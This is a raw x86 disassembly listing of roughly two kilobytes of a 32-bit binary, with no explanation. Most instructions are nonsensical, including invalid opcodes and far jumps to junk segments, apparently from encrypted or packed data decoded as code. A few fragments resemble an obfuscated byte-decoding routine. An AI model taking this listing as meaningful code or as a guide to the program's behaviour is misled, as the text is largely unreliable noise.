  4038ed:	and    bh,BYTE PTR [edx]
  4038ef:	std    
  4038f0:	jl     0x403958
  4038f2:	pop    es
  4038f3:	test   al,0x94
  4038f5:	les    esp,FWORD PTR [edi]
  4038f7:	es xchg edi,eax
  4038f9:	mov    eax,ds:0xc9e0aa7d
  4038fe:	or     BYTE PTR [eax-0x3c],ah
  403901:	mov    bl,0x75
  403903:	pop    edx
  403904:	fwait
  403905:	xchg   esp,eax
  403906:	inc    esi
  403907:	inc    edi
  403908:	mov    ebp,0x1d99902f
  40390d:	sub    BYTE PTR [ecx],bl
  40390f:	inc    edi
  403910:	sub    bl,BYTE PTR [ebp-0x6236971c]
  403916:	lahf   
  403917:	(bad)  
  403918:	pop    esi
  403919:	sbb    al,0x6f
  40391b:	mov    al,0x10
  40391d:	mov    edx,0x3b2a4ddb
  403922:	or     al,0xe3
  403924:	sub    bh,BYTE PTR [ecx-0x77]
  403927:	pop    es
  403928:	jge    0x403911
  40392a:	rol    BYTE PTR [eax-0x22],0x3c
  40392e:	ins    BYTE PTR es:[edi],dx
  40392f:	shr    BYTE PTR [ebp+0x5e],0x9a
  403933:	sub    DWORD PTR [ebx-0x71],eax
  403936:	dec    DWORD PTR [esi]
  403938:	outs   dx,BYTE PTR ds:[esi]
  403939:	(bad)  
  40393a:	jnp    0x4038ef
  40393c:	ja     0x4038cb
  40393e:	add    al,BYTE PTR [ebx-0x5ceaab9f]
  403944:	je     0x40396e
  403946:	cmp    BYTE PTR [ecx-0x409c6d0c],0x53
  40394d:	out    0x99,eax
  40394f:	sti    
  403950:	ret    0xa4a9
  403953:	(bad)  
  403955:	pop    ebx
  403956:	fwait
  403957:	xor    eax,DWORD PTR [edx+0x17]
  40395a:	sbb    eax,0xf1d74ebc
  40395f:	xor    DWORD PTR [eax],0x54
  403962:	xlat   BYTE PTR ds:[ebx]
  403963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403964:	fmul   QWORD PTR [edi+0x34]
  403967:	mov    bh,BYTE PTR [edx+0x63]
  40396a:	daa    
  40396b:	sbb    dh,BYTE PTR [edx-0x4760d110]
  403971:	dec    esp
  403972:	or     ch,BYTE PTR fs:0xbb66af05
  403979:	pop    ebx
  40397a:	outs   dx,BYTE PTR ds:[esi]
  40397b:	jecxz  0x4039eb
  40397d:	cmp    BYTE PTR [edx+0x62b26bb7],0x26
  403984:	cld    
  403985:	(bad)  
  403986:	pop    ebp
  403987:	outs   dx,DWORD PTR ds:[esi]
  403988:	fcmovu st,st(0)
  40398a:	in     al,0xfc
  40398c:	xor    dl,BYTE PTR [ebp+0x2fbe885a]
  403992:	cmp    ebx,eax
  403994:	ret    0x3d90
  403997:	iret   
  403998:	rol    DWORD PTR ds:0x738cadde,cl
  40399e:	stos   DWORD PTR es:[edi],eax
  40399f:	cmp    eax,0xfa80e1bf
  4039a4:	pop    ecx
  4039a5:	or     al,BYTE PTR [esi-0x49]
  4039a8:	ja     0x4039ec
  4039aa:	sub    esp,eax
  4039ac:	pusha  
  4039ad:	or     DWORD PTR [ebp+eax*8-0x13],esp
  4039b1:	mov    ecx,0x50da74d1
  4039b6:	cmp    BYTE PTR [ebp+0x198eb722],ch
  4039bc:	pusha  
  4039bd:	push   esp
  4039be:	dec    eax
  4039bf:	retf   
  4039c0:	out    dx,eax
  4039c1:	dec    BYTE PTR [edx-0x5b]
  4039c4:	iret   
  4039c5:	out    dx,al
  4039c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4039c7:	outs   dx,DWORD PTR ds:[esi]
  4039c8:	mov    ch,0xa7
  4039ca:	pop    edx
  4039cb:	adc    al,0x57
  4039cd:	mov    esi,0x498d7a
  4039d2:	(bad)  
  4039d3:	cs loope 0x4039c6
  4039d6:	mov    al,0x2f
  4039d8:	dec    esi
  4039d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039da:	inc    ebp
  4039db:	leave  
  4039dc:	dec    ax
  4039de:	or     BYTE PTR [ebx-0x76],cl
  4039e1:	mov    edx,0xd1376d92
  4039e6:	retf   
  4039e7:	outs   dx,BYTE PTR ds:[esi]
  4039e8:	jo     0x4039d7
  4039ea:	push   ss
  4039eb:	aad    0x4
  4039ed:	(bad)
  4039f1:	jnp    0x403a25
  4039f3:	sub    eax,0x8a1adfb0
  4039f8:	mov    esi,0x52d52ee5
  4039fd:	popa   
  4039fe:	sbb    DWORD PTR [ebx],0xc2458402
  403a04:	enter  0x644d,0x59
  403a08:	and    ecx,DWORD PTR ds:0x26444c88
  403a0e:	rol    BYTE PTR [edi+0x6b2430b8],1
  403a14:	aaa    
  403a15:	(bad)  
  403a16:	cmp    DWORD PTR [ebx+ebp*8-0x5],esi
  403a1a:	sbb    edi,DWORD PTR gs:[eax+0x9]
  403a1e:	jp     0x403a33
  403a20:	ret    0x5a48
  403a23:	mov    edi,0x4f7e7374
  403a28:	pusha  
  403a29:	sub    bh,0xa8
  403a2c:	cmp    eax,0xcc276452
  403a31:	inc    ebx
  403a32:	(bad)  
  403a33:	retf   
  403a34:	rol    BYTE PTR [ebp+0x1d209d6a],cl
  403a3a:	jmp    0x403a78
  403a3c:	add    BYTE PTR ds:0x684741ab,dl
  403a42:	xchg   ecx,eax
  403a43:	push   0xdcf2ca66
  403a48:	shl    esp,0xb4
  403a4b:	jmp    0x4039e8
  403a4d:	(bad)  
  403a4e:	mov    esi,0x884585c9
  403a53:	add    eax,0x73a63112
  403a58:	ror    BYTE PTR [ebp+0x26],cl
  403a5b:	stc    
  403a5c:	dec    esi
  403a5d:	jge    0x403acb
  403a5f:	popf   
  403a60:	test   BYTE PTR [esi],0x62
  403a63:	scas   eax,DWORD PTR es:[edi]
  403a64:	inc    edx
  403a65:	hlt    
  403a66:	add    BYTE PTR [edi+0x335ef289],ah
  403a6c:	push   ss
  403a6d:	xchg   esi,eax
  403a6e:	xchg   esi,eax
  403a6f:	cmp    BYTE PTR [bx+di-0x63f6],dl
  403a74:	jo     0x403a9d
  403a76:	mov    al,ds:0x70d4838f
  403a7b:	pop    ebx
  403a7c:	and    ebp,edi
  403a7e:	loop   0x403a3b
  403a80:	mov    edi,0xb01b6157
  403a85:	xchg   esi,eax
  403a86:	lahf   
  403a87:	mov    esi,0x112beb81
  403a8c:	or     BYTE PTR [esp+esi*4-0x3a248854],ah
  403a93:	pop    edx
  403a94:	cmp    esp,DWORD PTR [ebp+0x7af17883]
  403a9a:	xor    edx,DWORD PTR [edi-0x4ec4136]
  403aa0:	xchg   ebx,eax
  403aa1:	pop    esi
  403aa2:	mov    esi,0x48c64bb6
  403aa7:	inc    edi
  403aa8:	test   DWORD PTR [bp-0x39f3],esi
  403aad:	div    DWORD PTR [eax-0x5b]
  403ab0:	mov    ecx,0x3871e317
  403ab5:	sub    cl,BYTE PTR [ecx+0x705e038a]
  403abb:	jecxz  0x403b0b
  403abd:	data16 (bad) 
  403abf:	bound  edi,QWORD PTR [ecx-0x27]
  403ac2:	fidivr WORD PTR [eax-0x74]
  403ac5:	into   
  403ac6:	iret   
  403ac7:	cdq    
  403ac8:	je     0x403ac9
  403aca:	mov    ah,0xd6
  403acc:	shl    eax,cl
  403ace:	mov    BYTE PTR cs:[ebp+esi*1-0x3d5c95cd],dl
  403ad6:	loope  0x403a97
  403ad8:	shr    DWORD PTR [ebp-0x25],cl
  403adb:	in     eax,0x5b
  403add:	mov    ecx,0xcf0e8011
  403ae2:	mov    eax,ds:0xa4d3768a
  403ae7:	popa   
  403ae8:	mov    esi,DWORD PTR [ecx+0x58]
  403aeb:	push   edx
  403aec:	and    bh,ch
  403aee:	test   al,0xa9
  403af0:	mov    al,BYTE PTR [ebp-0x1]
  403af3:	movzx  ecx,WORD PTR ds:0x42e7eb
  403afa:	adc    DWORD PTR ds:0x42fe76,ecx
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e224,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fdfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fdf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx+0x76cacf97],esi
  403b3e:	in     eax,0xc5
  403b40:	push   ds
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0xb870707d
  403b48:	jns    0x403b40
  403b4a:	rcr    DWORD PTR [esi-0x78],0x46
  403b4e:	fwait
  403b4f:	push   ebp
  403b50:	push   ebx
  403b51:	dec    edi
  403b52:	xor    al,0x99
  403b54:	adc    BYTE PTR [edx],cl
  403b56:	sbb    al,0x5c
  403b58:	push   0xffffffe6
  403b5a:	xchg   ebx,eax
  403b5b:	jo     0x403b55
  403b5d:	daa    
  403b5e:	clc    
  403b5f:	and    BYTE PTR [ecx-0x20],dh
  403b62:	ja     0x403b0c
  403b64:	push   esp
  403b65:	xchg   ebx,eax
  403b66:	push   es
  403b67:	loop   0x403b32
  403b69:	sub    DWORD PTR [eax],edi
  403b6b:	pop    edx
  403b6c:	in     al,0x41
  403b6e:	and    bh,ch
  403b70:	mov    cl,0xa9
  403b72:	cmp    esp,DWORD PTR [ebp-0x22]
  403b75:	imul   edi,DWORD PTR [esi+ebx*1-0x40838a45],0xffffff90
  403b7d:	das    
  403b7e:	leave  
  403b7f:	je     0x403b94
  403b81:	mov    edi,0xc4018edb
  403b86:	mov    eax,0x9912657a
  403b8b:	lock cs stc 
  403b8e:	fcom   QWORD PTR [ebp+0x6]
  403b91:	fadd   QWORD PTR [esp+esi*1]
  403b94:	cmp    ecx,eax
  403b96:	shl    DWORD PTR [eax],1
  403b98:	fdiv   st,st(2)
  403b9a:	or     al,0xc2
  403b9c:	push   cs
  403b9d:	nop
  403b9e:	sahf   
  403b9f:	imul   edx,DWORD PTR [ecx+edi*4+0x7643f5d4],0x2b
  403ba7:	inc    ebx
  403ba8:	repz push es
  403baa:	aad    0x8c
  403bac:	xchg   ebx,esp
  403bae:	fsub   QWORD PTR [esi-0x3]
  403bb1:	addr16 push esi
  403bb3:	and    ecx,ebp
  403bb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bb6:	and    ch,BYTE PTR [ebx+0x7dfd2a66]
  403bbc:	(bad)  
  403bbd:	cmp    eax,0xbdec535
  403bc2:	cmp    ebx,DWORD PTR [edi]
  403bc4:	xchg   DWORD PTR [esi+ebx*8],edx
  403bc7:	xor    cl,BYTE PTR [edi-0x6f2a20d2]
  403bcd:	push   esp
  403bce:	add    esi,DWORD PTR [eax-0x20414044]
  403bd4:	jle    0x403c31
  403bd6:	shr    BYTE PTR [edx+ebx*2-0x7ec31c6d],0xa1
  403bde:	mov    ds:0x2b9cc00a,al
  403be3:	or     al,0x31
  403be5:	mov    ecx,0x8ccd7691
  403bea:	in     al,dx
  403beb:	mov    bh,0x8c
  403bed:	pop    ebp
  403bee:	aaa    
  403bef:	push   ss
  403bf0:	int3   
  403bf1:	sub    bh,BYTE PTR [edx-0x36]
  403bf4:	pop    edi
  403bf5:	fisttp WORD PTR [edi]
  403bf7:	retf   
  403bf8:	add    al,0xdf
  403bfa:	fcom   DWORD PTR [ebx]
  403bfc:	mov    edx,0xd3ddb282
  403c01:	pusha  
  403c02:	push   eax
  403c03:	sbb    cl,BYTE PTR [ebp-0x1767c1dc]
  403c09:	xor    al,0x0
  403c0b:	fwait
  403c0c:	(bad)  
  403c0d:	xor    ah,cl
  403c0f:	sub    eax,0x6617ec9c
  403c14:	ss dec ebx
  403c16:	jbe    0x403c27
  403c18:	xor    eax,0xddaec479
  403c1d:	in     al,dx
  403c1e:	adc    BYTE PTR [ebx],dl
  403c20:	push   0xe78356fd
  403c25:	scas   al,BYTE PTR es:[edi]
  403c26:	js     0x403c69
  403c28:	add    al,0xf7
  403c2a:	not    esp
  403c2c:	popa   
  403c2d:	push   ecx
  403c2e:	sbb    bh,BYTE PTR [esi-0x1b]
  403c31:	ror    DWORD PTR ds:0x94f73f43,cl
  403c37:	ds pop es
  403c39:	xchg   ecx,eax
  403c3a:	and    BYTE PTR [ecx],bl
  403c3c:	fs inc ebx
  403c3e:	adc    ecx,DWORD PTR [ebp+0x47e76c08]
  403c44:	mov    bl,BYTE PTR [edx]
  403c46:	or     al,0xab
  403c48:	mov    WORD PTR [ebx+0x4292a795],gs
  403c4e:	dec    ebx
  403c4f:	out    0x95,eax
  403c51:	adc    eax,0x49747875
  403c56:	sbb    esi,DWORD PTR [esi+0x32860022]
  403c5c:	je     0x403c40
  403c5e:	dec    eax
  403c5f:	cli    
  403c60:	dec    ebp
  403c61:	arpl   ax,bx
  403c63:	jecxz  0x403c1c
  403c65:	inc    esi
  403c66:	mov    BYTE PTR [ebx+0x5657a420],ah
  403c6c:	outs   dx,BYTE PTR ds:[esi]
  403c6d:	mov    al,ds:0x111586bf
  403c72:	xor    BYTE PTR [esi],al
  403c74:	xchg   ebx,eax
  403c75:	jecxz  0x403c0d
  403c77:	repz add BYTE PTR [esi+0x22a8e374],dh
  403c7e:	in     eax,0x88
  403c80:	sub    DWORD PTR [edx],0x59
  403c83:	dec    esi
  403c84:	dec    ebx
  403c85:	dec    esp
  403c87:	cli    
  403c88:	xor    DWORD PTR [ebp+0x6],ecx
  403c8b:	push   ebp
  403c8c:	bsf    edx,DWORD PTR [edx+0x52]
  403c90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c91:	mov    eax,0xd73eece0
  403c96:	and    edi,DWORD PTR [ecx-0x7fffeca5]
  403c9c:	mov    ebx,0x4d5b5520
  403ca1:	outs   dx,BYTE PTR ds:[esi]
  403ca2:	dec    eax
  403ca3:	sub    BYTE PTR [ecx+0x247a33f3],ah
  403ca9:	hlt    
  403caa:	jle    0x403cf4
  403cac:	inc    ecx
  403cad:	adc    BYTE PTR [ebx],ch
  403caf:	xor    DWORD PTR [ebx+0x1c],esp
  403cb2:	fistp  DWORD PTR [ebx+0xd]
  403cb5:	loope  0x403c52
  403cb7:	or     al,0xf4
  403cb9:	call   0x6ec11f1
  403cbe:	gs mov eax,0x5d9c407d
  403cc4:	out    dx,eax
  403cc5:	mov    al,0x51
  403cc7:	sbb    esi,DWORD PTR [edi-0x29751b99]
  403ccd:	jae    0x403c86
  403ccf:	test   BYTE PTR [ebp+0x13],dl
  403cd2:	loopne 0x403d0a
  403cd4:	int3   
  403cd5:	aas    
  403cd6:	dec    ecx
  403cd7:	dec    ecx
  403cd8:	fld    QWORD PTR [edx-0x3d]
  403cdb:	inc    esp
  403cdc:	hlt    
  403cdd:	or     eax,0xcef9e1
  403ce2:	hlt    
  403ce3:	mov    esi,DWORD PTR [eax]
  403ce5:	inc    eax
  403ce6:	xchg   ebp,eax
  403ce7:	into   
  403ce8:	or     dh,bh
  403cea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ceb:	mov    cl,0x16
  403ced:	scas   eax,DWORD PTR es:[edi]
  403cee:	sahf   
  403cef:	dec    ebp
  403cf0:	jecxz  0x403cf0
  403cf2:	call   FWORD PTR [edi+0x357413f6]
  403cf8:	ret    
  403cf9:	sbb    al,0xab
  403cfb:	jb     0x403cdc
  403cfd:	imul   ebx,DWORD PTR [ecx],0xa1e8cbb0
  403d03:	sbb    al,0x28
  403d05:	into   
  403d06:	addr16 inc ebp
  403d08:	outs   dx,BYTE PTR ds:[esi]
  403d09:	jg     0x403d3e
  403d0b:	lods   eax,DWORD PTR ds:[esi]
  403d0c:	pop    esi
  403d0d:	in     al,dx
  403d0e:	call   0xfe0720c2
  403d13:	mov    al,BYTE PTR [esi+0x65]
  403d16:	xchg   ebx,eax
  403d17:	pop    esp
  403d18:	jg     0x403d8d
  403d1a:	stos   BYTE PTR es:[edi],al
  403d1b:	inc    ebp
  403d1c:	xor    eax,0xc17dbd6a
  403d21:	sbb    al,0x17
  403d23:	(bad)  
  403d24:	aam    0xf9
  403d26:	cmp    eax,0xb5e6e6b4
  403d2b:	in     eax,0x54
  403d2d:	mov    edi,ebx
  403d2f:	adc    al,0x6d
  403d31:	sub    eax,0xc4cb7eda
  403d36:	sahf   
  403d37:	xor    al,0x71
  403d39:	neg    ebp
  403d3b:	and    DWORD PTR [ebx+0x9057b73],edx
  403d41:	mov    ch,0x34
  403d43:	sub    eax,0xc6555360
  403d48:	mov    DWORD PTR [eax-0x95abd37],ecx
  403d4e:	xor    edx,0x18b5078b
  403d54:	jae    0x403d91
  403d56:	pop    esp
  403d57:	arpl   WORD PTR [esi+0x68860df],di
  403d5d:	jge    0x403ddb
  403d5f:	iret   
  403d60:	in     eax,0xd0
  403d62:	loop   0x403dd7
  403d64:	mov    edi,0x1538cf54
  403d69:	mov    dh,0x80
  403d6b:	inc    esi
  403d6c:	pusha  
  403d6d:	icebp  
  403d6e:	inc    edx
  403d6f:	jge    0x403d61
  403d71:	ss ins DWORD PTR es:[edi],dx
  403d73:	not    BYTE PTR [eax-0x52]
  403d76:	jns    0x403d3d
  403d78:	jbe    0x403daa
  403d7a:	loopne 0x403d58
  403d7c:	dec    edi
  403d7d:	add    esp,DWORD PTR [ebp+0x913cc5d]
  403d83:	call   DWORD PTR ds:0x1febe653
  403d89:	mov    edx,0x95a307eb
  403d8e:	(bad)  
  403d8f:	and    eax,0x3541b092
  403d94:	pop    ss
  403d95:	mov    di,0xaf30
  403d99:	mov    ecx,0xff1b93f5
  403d9e:	sbb    eax,0xe41e836c
  403da3:	jmp    0x9944:0x14a9b420
  403daa:	iret   
  403dab:	mov    esp,0x8f1e959f
  403db0:	fwait
  403db1:	xlat   BYTE PTR ds:[ebx]
  403db2:	mov    esi,0xfd0440a3
  403db7:	in     al,0x7a
  403db9:	sar    DWORD PTR [ecx+0x514ec293],1
  403dbf:	out    0x85,eax
  403dc1:	fwait
  403dc2:	ja     0x403de7
  403dc4:	push   edi
  403dc5:	add    edi,edi
  403dc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dc8:	mov    dh,0xd1
  403dca:	pop    esi
  403dcb:	jg     0x403dc8
  403dcd:	fld    QWORD PTR [edx+0x40]
  403dd0:	xor    DWORD PTR [esp+eiz*2],ebp
  403dd3:	shr    BYTE PTR [ebp+0x7e6192c],0xd7
  403dda:	sub    al,0xa
  403ddc:	dec    esi
  403ddd:	mov    ch,0x57
  403ddf:	mov    bl,0xe3
  403de1:	out    0x29,al
  403de3:	adc    cl,BYTE PTR ds:0x99516525
  403de9:	sbb    ebx,DWORD PTR [edi+0x11]
  403dec:	sti    
  403ded:	pop    edx
  403dee:	sti    
  403def:	mov    bl,0x89
  403df1:	cs aaa 
  403df3:	lods   eax,DWORD PTR ds:[esi]
  403df4:	xchg   ecx,eax
  403df5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403df6:	mov    ecx,0xac6ebbaa
  403dfb:	ret    
  403dfc:	inc    ebp
  403dfd:	mov    al,0x7
  403dff:	fcom   QWORD PTR [ebx+0x56]
  403e02:	clc    
  403e03:	dec    esp
  403e04:	jp     0x403e31
  403e06:	sti    
  403e07:	das    
  403e08:	cmp    ecx,ebx
  403e0a:	push   esp
  403e0b:	cmp    esp,ebx
  403e0d:	mov    ebp,0xcb08f97e
  403e12:	popw   ds
  403e14:	hlt    
  403e15:	jmp    0x65f5:0x59ba4517
  403e1c:	pop    ds
  403e1d:	xchg   DWORD PTR [ebx+0xf],esp
  403e20:	pop    es
  403e21:	xchg   ebx,eax
  403e22:	or     al,0xdd
  403e24:	scas   eax,DWORD PTR es:[edi]
  403e25:	push   edi
  403e26:	inc    esi
  403e27:	data16 add dh,al
  403e2a:	jmp    0x46d7:0x6a9ec521
  403e31:	or     al,0xb6
  403e33:	out    0x42,eax
  403e35:	xor    DWORD PTR [ecx-0x2ec5eda4],0x69
  403e3c:	icebp  
  403e3d:	sbb    DWORD PTR [eax-0x4d],edi
  403e40:	jne    0x403e3d
  403e42:	pop    ebx
  403e43:	push   0xffffffaf
  403e45:	nop
  403e46:	jle    0x403eaf
  403e48:	out    0xcb,al
  403e4a:	pop    ecx
  403e4b:	add    DWORD PTR [ebx+0x3a],edi
  403e4e:	sar    BYTE PTR [eax],0x62
  403e51:	scas   eax,DWORD PTR es:[edi]
  403e52:	sbb    bh,dl
  403e54:	shr    DWORD PTR [ebx-0x2b],0xcb
  403e58:	lahf   
  403e59:	fsub   DWORD PTR [ecx+eax*1]
  403e5c:	fcomp  QWORD PTR [ebx+0x49]
  403e5f:	imul   eax,DWORD PTR [edi+0x4a],0xb9e7db01
  403e66:	mov    dl,BYTE PTR [eax]
  403e68:	sbb    eax,0x90c29402
  403e6d:	fstp   DWORD PTR [edi-0x1c5f83e9]
  403e73:	sub    al,0xdd
  403e75:	aas    
  403e76:	stc    
  403e77:	test   DWORD PTR [ebx+edx*1-0x3c],esp
  403e7b:	inc    esi
  403e7c:	xchg   ebp,eax
  403e7d:	ret    
  403e7e:	fpatan 
  403e80:	fiadd  DWORD PTR [edx+0x5]
  403e83:	mov    al,0x61
  403e85:	mov    bh,BYTE PTR [esi-0x3886376a]
  403e8b:	inc    ebp
  403e8c:	lock xor BYTE PTR [ebp+0x458bf89c],al
  403e93:	clc    
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e21c
  403ea2:	adc    DWORD PTR ds:0x42e80f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fe72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fe05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e7ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x13691c35
  403eec:	xchg   DWORD PTR [ebx-0x7e],edx
  403eef:	sbb    esi,DWORD PTR [eax+0x70]
  403ef2:	cmp    eax,0xae70707d
  403ef7:	fst    QWORD PTR [ebp-0x5e]
  403efa:	mov    bl,0xdf
  403efc:	cdq    
  403efd:	fwait
  403efe:	sub    BYTE PTR [ebx],al
  403f00:	mov    ds,edx
  403f02:	jl     0x403f2e
  403f04:	adc    BYTE PTR [esi+eax*1],0x1a
  403f08:	dec    ebx
  403f09:	pop    eax
  403f0a:	mov    ds:0xa66ab7e3,al
  403f0f:	jbe    0x403f4f
  403f11:	mov    ds:0x5344c050,al
  403f16:	xchg   esi,eax
  403f17:	mov    bl,0xad
  403f19:	pcmpeqb mm4,QWORD PTR [esi+0x19cd1b20]
  403f20:	jbe    0x403ee9
  403f22:	sbb    DWORD PTR [edi],ebx
  403f24:	mov    bl,0x99
  403f26:	cwde   
  403f27:	outs   dx,DWORD PTR ds:[esi]
  403f28:	rcl    DWORD PTR [eax],1
  403f2a:	repz in eax,0xf1
  403f2d:	push   eax
  403f2e:	loop   0x403eb1
  403f30:	js     0x403ec0
  403f32:	xchg   ecx,eax
  403f33:	repz jl 0x403ec8
  403f36:	ja     0x403f97
  403f38:	xor    esp,eax
  403f3a:	mov    bl,0x18
  403f3c:	pop    ebx
  403f3d:	mov    ?,WORD PTR [esi+0x1b]
  403f40:	and    eax,0xb636153
  403f45:	into   
  403f46:	mov    edx,0x52928f97
  403f4b:	inc    eax
  403f4c:	retf   0x6c8d
  403f4f:	push   0x60
  403f51:	lds    eax,FWORD PTR [ebp+0x0]
  403f54:	(bad)  
  403f55:	mov    eax,ds:0x6782f5c3
  403f5a:	out    dx,al
  403f5b:	push   edi
  403f5c:	out    dx,eax
  403f5d:	xchg   edi,eax
  403f5e:	pop    eax
  403f5f:	rol    bl,0xd6
  403f62:	mov    al,0xa
  403f64:	out    dx,eax
  403f65:	loopne 0x403fd2
  403f67:	shr    DWORD PTR [ecx+0x5d],0x27
  403f6b:	add    BYTE PTR [ecx+0x2deddb6f],al
  403f71:	add    BYTE PTR [edi+0x7bca19c2],al
  403f77:	(bad)  
  403f78:	xor    DWORD PTR [esi-0x22],ebx
  403f7b:	scas   al,BYTE PTR es:[edi]
  403f7c:	enter  0x990a,0xda
  403f80:	xor    eax,0xcde6ec5f
  403f85:	jmp    0xb33abcce
  403f8a:	xlat   BYTE PTR ds:[ebx]
  403f8b:	or     eax,0x9b2092cd
  403f90:	xchg   esp,eax
  403f91:	cld    
  403f92:	adc    esp,esi
  403f94:	mov    al,0xb0
  403f96:	xchg   ebx,eax
  403f97:	mov    ebp,0xf6daa61
  403f9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403f9d:	cmp    ebx,DWORD PTR [edx-0x6484c6bb]
  403fa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fa4:	scas   eax,DWORD PTR es:[edi]
  403fa5:	cmp    al,0x80
  403fa7:	rol    BYTE PTR [ecx+ebx*2+0x2e9ef038],1
  403fae:	stos   DWORD PTR es:[edi],eax
  403faf:	popf   
  403fb0:	add    dh,BYTE PTR [eax+0x28350fe1]
  403fb6:	test   cl,bh
  403fb8:	inc    ecx
  403fb9:	push   edx
  403fba:	cmp    dh,bl
  403fbc:	hlt    
  403fbd:	dec    esi
  403fbe:	cld    
  403fbf:	and    ebp,ecx
  403fc1:	das    
  403fc2:	aam    0x58
  403fc4:	loop   0x403f63
  403fc6:	mov    al,dl
  403fc8:	xor    al,0xaa
  403fca:	add    esp,0x65
  403fcd:	fcom   DWORD PTR [ebx+0x651493be]
  403fd3:	retf   
  403fd4:	bound  edi,QWORD PTR [esi-0x12]
  403fd7:	mov    bl,0x28
  403fd9:	test   al,0xb6
  403fdb:	leave  
  403fdc:	iret   
  403fdd:	xor    eax,ecx
  403fdf:	std    
  403fe0:	jo     0x403f75
  403fe2:	popf   
  403fe3:	mov    edi,0x1978be8f
  403fe8:	fidivr WORD PTR [eax]
  403fea:	pop    ecx
  403feb:	push   eax
  403fec:	loopne 0x403faf
  403fee:	(bad)  [ebx+eax*4+0x75fe3e09]
  403ff5:	addr16 pop esi
  403ff7:	cld    
  403ff8:	cdq    
  403ff9:	popa   
  403ffa:	pop    es
  403ffb:	ja     0x404010
  403ffd:	push   0xfffffff4
  403fff:	add    eax,0x98dba25d
  404004:	xchg   DWORD PTR [ecx-0x5b3c8136],ebp
  40400a:	aam    0x8b
  40400c:	sbb    esi,esi
  40400e:	push   ebx
  40400f:	add    bh,ah
  404011:	pushf  
  404012:	jnp    0x404080
  404014:	push   0xffffff87
  404016:	add    BYTE PTR [eax-0x16],ch
  404019:	mov    ds,WORD PTR [edi-0x65]
  40401c:	stc    
  40401d:	lock push cs
  40401f:	xor    eax,0x89f9327d
  404024:	shr    BYTE PTR [esi+0x4ed7d940],1
  40402a:	push   edx
  40402b:	aad    0x29
  40402d:	xchg   BYTE PTR [ecx-0x6f],bh
  404030:	pop    es
  404031:	mov    eax,ds:0xd6beea59
  404036:	loope  0x403fdb
  404038:	push   ecx
  404039:	sbb    ah,cl
  40403b:	or     DWORD PTR [esp+eax*4],0x3800473d
  404042:	add    DWORD PTR [ebx-0x6ef0315e],ecx
  404048:	dec    esi
  404049:	stos   BYTE PTR es:[edi],al
  40404a:	ret    
  40404b:	mov    eax,ds:0xe819ae52
  404050:	push   cs
  404051:	stos   BYTE PTR es:[edi],al
  404052:	mov    bh,0x37
  404054:	sbb    ecx,ecx
  404056:	mov    ah,0xb3
  404058:	fadd   QWORD PTR [esi+0x72]
  40405b:	sbb    eax,0x7f408ff1
  404060:	xor    al,0xf8
  404062:	scas   eax,DWORD PTR es:[edi]
  404063:	mov    edi,0xec7713d8
  404068:	aad    0xac
  40406a:	data16 scas al,BYTE PTR es:[edi]
  40406c:	pop    esp
  40406d:	popf   
  40406e:	(bad)  [ebx+0x235a6133]
  404074:	and    eax,0x46a5cc55
  404079:	push   cs
  40407a:	das    
  40407b:	lea    edi,[ebx+0x63]
  40407e:	(bad)  
  40407f:	std    
  404080:	loope  0x4040e4
  404082:	xchg   ebp,eax
  404083:	rcl    DWORD PTR [edi],1
  404085:	icebp  
  404086:	dec    edx
  404087:	xor    DWORD PTR [ebp+ebx*1-0x30a6da2f],eax
  40408e:	xor    BYTE PTR [esi-0x41],dh
  404091:	jae    0x4040ce
  404093:	leave  
  404094:	dec    bp
  404096:	push   esp
  404097:	test   DWORD PTR [ebp+0x630df0a5],ebp
  40409d:	and    DWORD PTR [ecx-0x1f4c91f4],edi
  4040a3:	dec    ecx
  4040a4:	fcom   DWORD PTR [edx-0x5c3054b8]
  4040aa:	(bad)  
  4040ab:	out    dx,eax
  4040ac:	pop    ebp
  4040ad:	mov    ebp,0x935f45c5
  4040b2:	dec    ebx
  4040b3:	jo     0x404124
  4040b5:	idiv   BYTE PTR [eax+0x59]
  4040b8:	lock add esp,0xdf934ec1
  4040bf:	cmc    
  4040c0:	cmp    esi,DWORD PTR [edi+ecx*2+0xd]
  4040c4:	cmp    cl,bl
  4040c6:	push   esp
  4040c7:	xor    al,0xe9
  4040c9:	dec    dx
  4040cb:	and    ah,dl
  4040cd:	xchg   BYTE PTR [ebx+0x1e680c8e],ah
  4040d3:	mov    dl,0x22
  4040d5:	lock jmp DWORD PTR [esi+0x3e]
  4040d9:	dec    esi
  4040da:	test   DWORD PTR [ebx+0x1],ebp
  4040dd:	jmp    0x9c18:0xe96d8525
